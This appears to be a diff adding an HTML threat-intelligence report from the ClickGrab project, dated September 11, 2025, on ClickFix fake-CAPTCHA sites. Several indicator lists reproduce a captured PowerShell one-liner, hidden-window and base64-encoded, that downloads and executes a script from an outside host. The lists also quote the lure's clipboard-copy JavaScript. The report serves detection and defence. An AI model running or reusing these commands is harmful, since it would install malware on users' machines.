@@ -1,0 +1,1901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickGrab Report - September 11, 2025</title>
+    <meta name="description" content="ClickGrab analyzes potential ClickFix and FakeCAPTCHA URLs from URLhaus">
+    <link rel="stylesheet" href="/ClickGrab/assets/css/styles.css">
+    <link rel="icon" href="/ClickGrab/assets/images/favicon.ico" type="image/x-icon">
+    <style>
+        .text-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FF9900;
+        }
+    </style>
+    
+<style>
+    /* Report Header */
+    .report-hero {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 3rem 2rem;
+        border-radius: 16px;
+        margin-bottom: 2rem;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .report-hero::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+        opacity: 0.3;
+    }
+    
+    .report-hero-content {
+        position: relative;
+        z-index: 1;
+    }
+    
+    .report-title {
+        font-size: 2.5rem;
+        font-weight: 700;
+        margin-bottom: 1rem;
+    }
+    
+    .report-meta {
+        display: flex;
+        gap: 2rem;
+        flex-wrap: wrap;
+        font-size: 1.1rem;
+        opacity: 0.95;
+    }
+    
+    /* Summary Cards */
+    .summary-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 1.5rem;
+        margin-bottom: 3rem;
+    }
+    
+    .summary-card {
+        background: white;
+        border-radius: 12px;
+        padding: 1.5rem;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        text-align: center;
+        transition: transform 0.3s ease;
+        border: 1px solid #e5e7eb;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .summary-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, var(--gradient-start), var(--gradient-end));
+    }
+    
+    .summary-card.total { --gradient-start: #667eea; --gradient-end: #764ba2; }
+    .summary-card.threats { --gradient-start: #f093fb; --gradient-end: #f5576c; }
+    .summary-card.powershell { --gradient-start: #4facfe; --gradient-end: #00f2fe; }
+    .summary-card.clipboard { --gradient-start: #fa709a; --gradient-end: #fee140; }
+    .summary-card.score { --gradient-start: #30cfd0; --gradient-end: #330867; }
+    
+    .summary-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+    }
+    
+    .summary-icon {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+    }
+    
+    .summary-value {
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: var(--text-color);
+        margin-bottom: 0.5rem;
+    }
+    
+    .summary-label {
+        color: var(--text-light);
+        font-size: 0.9rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+    
+    .summary-change {
+        margin-top: 0.5rem;
+        font-size: 0.85rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.25rem;
+    }
+    
+    .change-up { color: #ef4444; }
+    .change-down { color: #22c55e; }
+    
+    /* Threat Overview */
+    .threat-overview {
+        background: white;
+        border-radius: 12px;
+        padding: 2rem;
+        margin-bottom: 3rem;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    
+    .threat-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 2rem;
+        flex-wrap: wrap;
+        gap: 1rem;
+    }
+    
+    .threat-title {
+        font-size: 1.75rem;
+        font-weight: 600;
+        color: var(--text-color);
+    }
+    
+    .threat-actions {
+        display: flex;
+        gap: 1rem;
+    }
+    
+    .action-btn {
+        padding: 0.5rem 1rem;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        background: white;
+        color: var(--text-color);
+        font-size: 0.9rem;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
+    
+    .action-btn:hover {
+        background: #f9fafb;
+        border-color: #667eea;
+        color: #667eea;
+    }
+
+    /* Simple bar chart styles */
+    .bars {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+        gap: 1rem;
+        margin-top: 1rem;
+    }
+    .bar {
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        padding: 0.75rem;
+    }
+    .bar-label { font-size: 0.9rem; color: var(--text-light); }
+    .bar-track { height: 10px; background: #eef2ff; border-radius: 6px; margin-top: 0.5rem; overflow: hidden; }
+    .bar-fill { height: 100%; background: linear-gradient(90deg,#667eea,#764ba2); border-radius: 6px; width: 0%; transition: width .6s ease; }
+    
+    /* Site Analysis Cards */
+    .sites-section {
+        margin-bottom: 3rem;
+    }
+    
+    .sites-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 2rem;
+    }
+    
+    .site-card {
+        background: white;
+        border-radius: 12px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+        margin-bottom: 1.5rem;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        border: 1px solid #e5e7eb;
+    }
+    
+    .site-card:hover {
+        box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+        border-color: #667eea;
+    }
+    
+    .site-header {
+        background: #f9fafb;
+        padding: 1.5rem;
+        border-bottom: 1px solid #e5e7eb;
+        cursor: pointer;
+    }
+    
+    .site-header-content {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 1rem;
+    }
+    
+    .site-url {
+        font-weight: 600;
+        color: #ef4444;
+        word-break: break-all;
+        font-family: monospace;
+        font-size: 0.95rem;
+    }
+    
+    .site-badges {
+        display: flex;
+        gap: 0.5rem;
+        flex-wrap: wrap;
+    }
+    
+    .threat-score-badge {
+        padding: 0.25rem 0.75rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 600;
+        color: white;
+    }
+    
+    .score-critical { background: #dc2626; }
+    .score-high { background: #ef4444; }
+    .score-medium { background: #f59e0b; }
+    .score-low { background: #3b82f6; }
+    
+    .attack-type-badge {
+        padding: 0.25rem 0.75rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 500;
+        background: #e0e7ff;
+        color: #4c1d95;
+    }
+    
+    .site-details {
+        display: none;
+        padding: 1.5rem;
+    }
+    
+    .site-card.expanded .site-details {
+        display: block;
+    }
+    
+    .detail-tabs {
+        display: flex;
+        gap: 1rem;
+        margin-bottom: 1.5rem;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    
+    .detail-tab {
+        padding: 0.5rem 1rem;
+        border: none;
+        background: none;
+        color: var(--text-light);
+        font-weight: 500;
+        cursor: pointer;
+        position: relative;
+        transition: color 0.2s ease;
+    }
+    
+    .detail-tab:hover {
+        color: var(--text-color);
+    }
+    
+    .detail-tab.active {
+        color: #667eea;
+    }
+    
+    .detail-tab.active::after {
+        content: '';
+        position: absolute;
+        bottom: -1px;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: #667eea;
+    }
+    
+    .tab-content {
+        display: none;
+    }
+    
+    .tab-content.active {
+        display: block;
+    }
+    
+    /* Indicator Lists */
+    .indicator-group {
+        margin-bottom: 2rem;
+    }
+    
+    .indicator-title {
+        font-size: 1.1rem;
+        font-weight: 600;
+        margin-bottom: 1rem;
+        color: var(--text-color);
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+    
+    .indicator-count {
+        background: #e0e7ff;
+        color: #4c1d95;
+        padding: 0.125rem 0.5rem;
+        border-radius: 12px;
+        font-size: 0.8rem;
+        font-weight: 500;
+    }
+    
+    .indicator-list {
+        background: #f9fafb;
+        border-radius: 8px;
+        padding: 1rem;
+        font-family: monospace;
+        font-size: 0.85rem;
+        max-height: 300px;
+        overflow-y: auto;
+    }
+    
+    .indicator-item {
+        padding: 0.5rem;
+        margin-bottom: 0.5rem;
+        background: white;
+        border-radius: 4px;
+        word-break: break-all;
+    }
+    
+    .code-block {
+        background: #1e293b;
+        color: #e2e8f0;
+        padding: 1rem;
+        border-radius: 8px;
+        overflow-x: auto;
+        font-family: monospace;
+        font-size: 0.85rem;
+        position: relative;
+        margin-bottom: 1rem;
+    }
+    
+    .copy-btn {
+        position: absolute;
+        top: 0.5rem;
+        right: 0.5rem;
+        background: rgba(255,255,255,0.1);
+        border: 1px solid rgba(255,255,255,0.2);
+        color: white;
+        padding: 0.25rem 0.75rem;
+        border-radius: 4px;
+        font-size: 0.75rem;
+        cursor: pointer;
+        transition: background 0.2s ease;
+    }
+    
+    .copy-btn:hover {
+        background: rgba(255,255,255,0.2);
+    }
+    
+    /* Analysis Section */
+    .analysis-section {
+        background: white;
+        border-radius: 12px;
+        padding: 2rem;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    
+    .analysis-content {
+        line-height: 1.8;
+        color: var(--text-color);
+    }
+    
+    .analysis-content h2 {
+        font-size: 1.5rem;
+        color: #667eea;
+        margin: 2rem 0 1rem;
+        padding-bottom: 0.5rem;
+        border-bottom: 2px solid #e0e7ff;
+    }
+    
+    .analysis-content h3 {
+        font-size: 1.25rem;
+        color: var(--text-color);
+        margin: 1.5rem 0 1rem;
+    }
+    
+    .analysis-content pre {
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        padding: 1rem;
+        overflow-x: auto;
+        margin: 1rem 0;
+    }
+    
+    .analysis-content code {
+        background: #f3f4f6;
+        padding: 0.125rem 0.25rem;
+        border-radius: 3px;
+        font-size: 0.9em;
+    }
+    
+    .analysis-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1rem 0;
+    }
+    
+    .analysis-content th,
+    .analysis-content td {
+        padding: 0.75rem;
+        text-align: left;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    
+    .analysis-content th {
+        background: #f9fafb;
+        font-weight: 600;
+    }
+    
+    .analysis-content tr:hover {
+        background: #f9fafb;
+    }
+    
+    /* Responsive */
+    @media (max-width: 768px) {
+        .report-title {
+            font-size: 1.75rem;
+        }
+        
+        .summary-grid {
+            grid-template-columns: 1fr;
+        }
+        
+        .threat-header {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        
+        .site-header-content {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+    }
+    
+    /* Empty State */
+    .empty-state {
+        text-align: center;
+        padding: 3rem;
+        color: var(--text-light);
+    }
+    
+    .empty-icon {
+        font-size: 3rem;
+        margin-bottom: 1rem;
+        opacity: 0.5;
+    }
+</style>
+
+</head>
+<body>
+    <header class="site-header">
+        <div class="container">
+            <div class="logo">
+                <a href="/ClickGrab/">
+                    <img src="/ClickGrab/assets/images/logo.png" alt="ClickGrab" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+                    <span class="text-logo" style="display:none;">CLICKGRAB</span>
+                </a>
+            </div>
+            <nav class="main-nav">
+                <ul>
+                    <li><a href="/ClickGrab/" class="">Home</a></li>
+                    <li><a href="/ClickGrab/analysis.html" class="">Analysis</a></li>
+                    <li><a href="/ClickGrab/reports.html" class="active">Reports</a></li>
+                    <li><a href="/ClickGrab/techniques.html" class="">Techniques</a></li>
+                <li><a href="/ClickGrab/mitigations.html" class="">Mitigations</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main class="site-content">
+        <div class="container">
+            
+<!-- Report Header -->
+<section class="report-hero">
+    <div class="report-hero-content">
+        <h1 class="report-title">Threat Intelligence Report</h1>
+        <div class="report-meta">
+            <span>📅 September 11, 2025</span>
+            <span>🕒 Generated: 2025-09-11 02:16:43</span>
+            <span>🔍 Sites Analyzed: 10</span>
+        </div>
+    </div>
+</section>
+
+<!-- Summary Statistics -->
+<div class="summary-grid">
+    <div class="summary-card total">
+        <div class="summary-icon">🌐</div>
+        <div class="summary-value">10</div>
+        <div class="summary-label">Total Sites Analyzed</div>
+    </div>
+    
+    <div class="summary-card threats">
+        <div class="summary-icon">⚠️</div>
+        <div class="summary-value">6</div>
+        <div class="summary-label">Malicious Sites</div>
+        <div class="summary-change">
+                                        <span class="change-up">60.0% detection rate</span>
+        </div>
+    </div>
+    
+    <div class="summary-card powershell">
+        <div class="summary-icon">💻</div>
+        <div class="summary-value">15</div>
+        <div class="summary-label">PowerShell Commands</div>
+    </div>
+    
+    <div class="summary-card clipboard">
+        <div class="summary-icon">📋</div>
+        <div class="summary-value">24</div>
+        <div class="summary-label">Clipboard Hijacks</div>
+    </div>
+    
+    <div class="summary-card score">
+        <div class="summary-icon">📊</div>
+        <div class="summary-value">226</div>
+        <div class="summary-label">Avg Threat Score</div>
+    </div>
+</div>
+
+<!-- Threat Overview -->
+<section class="threat-overview">
+    <div class="threat-header">
+        <h2 class="threat-title">Attack Pattern Analysis</h2>
+        <div class="threat-actions">
+            <button class="action-btn" onclick="expandAll()">Expand All</button>
+            <button class="action-btn" onclick="collapseAll()">Collapse All</button>
+        </div>
+    </div>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem;">
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #dc2626;">9</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">High Risk Commands</div>
+        </div>
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #f59e0b;">61</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">Base64 Encoded</div>
+        </div>
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #8b5cf6;">0</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">Obfuscated JS</div>
+        </div>
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #3b82f6;">0</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">JS Redirects</div>
+        </div>
+    </div>
+
+    <!-- Aggregated indicators chart -->
+    <div class="bars" id="aggBars">
+        
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>PowerShellCommands</strong>
+                <span>15</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 25.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>EncodedPowerShell</strong>
+                <span>0</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 0.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>ClipboardManipulation</strong>
+                <span>18</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 30.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>ObfuscatedJavaScript</strong>
+                <span>0</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 0.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>Base64Strings</strong>
+                <span>61</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 100.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>JavaScriptRedirects</strong>
+                <span>0</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 0.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>CaptchaElements</strong>
+                <span>36</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 59.0%"></div></div>
+        </div>
+        
+    </div>
+
+    
+    <div style="margin-top:2rem;">
+        <h3 style="margin:0 0 .5rem 0;">Top Indicators/Keywords</h3>
+        <div style="display:flex; gap:.5rem; flex-wrap:wrap;">
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">robot (7)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">hidden (7)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">CAPTCHA Verification (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">I am not a robot (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">CAPTCHA (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">captcha-iogo (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">captcha (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">CAPTCHA-iogo (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">CaptchaListeners (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">CaptchaCheckbox (6)</span>
+            
+        </div>
+    </div>
+    
+</section>
+
+<!-- Detailed Site Analysis -->
+<section class="sites-section">
+    <div class="sites-header">
+        <h2 style="font-size: 1.75rem; font-weight: 600;">Malicious Sites Detected</h2>
+        <span style="color: var(--text-light);">Click on a site to view detailed analysis</span>
+    </div>
+    
+    
+        
+        <div class="site-card" data-url="https://test.peperoncinochepassione.it/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://test.peperoncinochepassione.it/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            49 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 346</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-1')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-1')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-1')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-1" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk commands</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-1" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">PowErsHeLL -W hiddEn &#34;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#39;aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=&#39;)) | iex&#34;`;</div>
+                            
+                            <div class="indicator-item">iex (iwr &#39;https://nicostudio.it/pZJHqter.txt&#39; -UseBasicParsing)</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">23</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-iogo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-1" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempText...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...k&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://www.test.peperoncinochepassione.it/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://www.test.peperoncinochepassione.it/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            49 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 346</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-2')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-2')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-2')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-2" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk commands</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-2" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">PowErsHeLL -W hiddEn &#34;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#39;aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=&#39;)) | iex&#34;`;</div>
+                            
+                            <div class="indicator-item">iex (iwr &#39;https://nicostudio.it/pZJHqter.txt&#39; -UseBasicParsing)</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">23</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-iogo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-2" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempText...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...k&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
